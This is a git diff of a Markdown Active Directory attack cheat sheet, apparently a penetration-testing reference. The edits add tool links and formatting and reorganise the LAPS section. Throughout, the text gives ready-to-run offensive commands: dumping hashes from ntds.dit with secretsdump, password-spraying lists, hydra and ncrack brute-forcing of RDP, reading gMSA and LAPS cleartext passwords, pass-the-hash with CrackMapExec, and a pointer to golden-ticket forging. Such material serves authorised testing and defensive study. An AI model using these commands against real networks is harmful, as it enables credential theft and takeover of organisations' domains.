@@ -1049,13 +1049,13 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 #### Extract hashes from ntds.dit
 
-then you need to use secretsdump to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
+then you need to use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
 
 ```java
 secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 ```
 
-secretsdump also works remotely
+[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) also works remotely
 
 ```java
 ./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
@@ -1143,10 +1143,10 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- P@ssw0rd01, Password123, Password1, Hello123, mimikatz
-- Welcome1/Welcome01
-- $Companyname1 : $Microsoft1
-- SeasonYear : Winter2019*, Spring2020!, Summer2018?, Summer2020, July2020!
+- `P@ssw0rd01`, `Password123`, `Password1`, `Hello123`, `mimikatz`
+- `Welcome1`/`Welcome01`
+- $Companyname1 :` $Microsoft1`
+- SeasonYear : `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
 
 
@@ -1191,12 +1191,12 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 #### Spray passwords against the RDP service
 
-* Using RDPassSpray to target RDP services.
+* Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
   ```powershell
   git clone https://github.com/xFreed0m/RDPassSpray
   python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
   ```
-* Using hydra and ncrack to target RDP services.
+* Using [hydra](https://github.com/vanhauser-thc/thc-hydra) and [ncrack](https://github.com/nmap/ncrack) to target RDP services.
   ```powershell
   hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
   ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
@@ -1222,7 +1222,7 @@ GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in acc
 GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account
 ```
 
-There are 3-4 fields that seem to be common in most AD schemas: UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
+There are 3-4 fields that seem to be common in most AD schemas: `UserPassword`, `UnixUserPassword`, `unicodePwd` and `msSFU30Password`.
 
 ```powershell
 enum4linux | grep -i desc
@@ -1241,15 +1241,15 @@ ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP
 > User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
 
 #### GMSA Attributes in the Active Directory 
-* **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password.
-* **msds-ManagedPassword** - This attribute contains a BLOB with password information for group-managed service accounts.
-* **msDS-ManagedPasswordId** - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
-* **msDS-ManagedPasswordInterval** - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
+* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
+* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
+* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
+* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
 
 
 #### Extract NT hash from the Active Directory
 
-* GMSAPasswordReader (C#)
+* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
   ```ps1
   # https://github.com/rvazarkar/GMSAPasswordReader
   GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
@@ -1287,53 +1287,67 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
 
 > The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
 
-* adsisearcher (native binary on Windows 8+)
-    ```powershell
-    ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
-    ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
-    ```
+ - From Windows:
 
-* CrackMapExec
-    ```powershell
-    crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
-    ```
+   * adsisearcher (native binary on Windows 8+)
+       ```powershell
+       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
+       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
+       ```
 
-* Powerview
-    ```powershell
-    PS > Import-Module .\PowerView.ps1
-    PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
-    ```
+   * [PowerView](https://github.com/PowerShellEmpire/PowerTools)
+       ```powershell
+       PS > Import-Module .\PowerView.ps1
+       PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
+       ```
 
-* LAPSToolkit - https://github.com/leoloobeek/LAPSToolkit
-    ```powershell
-    $ Get-LAPSComputers
-    ComputerName                Password                                 Expiration         
-    ------------                --------                                 ----------         
-    exmaple.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18
+   * [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
+       ```powershell
+       $ Get-LAPSComputers
+       ComputerName                Password                                 Expiration         
+       ------------                --------                                 ----------         
+       example.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18
 
-    $ Find-LAPSDelegatedGroups
-    $ Find-AdmPwdExtendedRights
-    ```
+       $ Find-LAPSDelegatedGroups
+       $ Find-AdmPwdExtendedRights
+       ```
 
-* ldapsearch
-    ```powershell
-    ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
-    ```
+   * Powershell AdmPwd.PS
+       ```powershell
+       foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
+       ```
 
-* LAPSDumper - https://github.com/n00py/LAPSDumper
-    ```powershell
-    python laps.py -u user -p password -d domain.local
-    python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
-    ```
+ - From linux:
 
-* Powershell AdmPwd.PS
-    ```powershell
-    foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
-    ```
+   * [pyLAPS](https://github.com/p0dalirius/pyLAPS) to **read** and **write** LAPS passwords:
+       ```bash
+       # Read the password of all computers
+       ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
+       # Write a random password to a specific computer
+       ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
+       ```
+     
+   * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):
+       ```bash
+       crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
+       ```
+
+   * [LAPSDumper](https://github.com/n00py/LAPSDumper) 
+       ```bash
+       python laps.py -u 'user' -p 'password' -d 'domain.local'
+       python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'
+       ```
+   
+   * ldapsearch
+      ```bash
+      ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
+      ```
+
+
 
 ### Pass-the-Ticket Golden Tickets
 
-Forging a TGT require the krbtgt NTLM hash
+Forging a TGT require the `krbtgt` NTLM hash
 
 > The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.
 
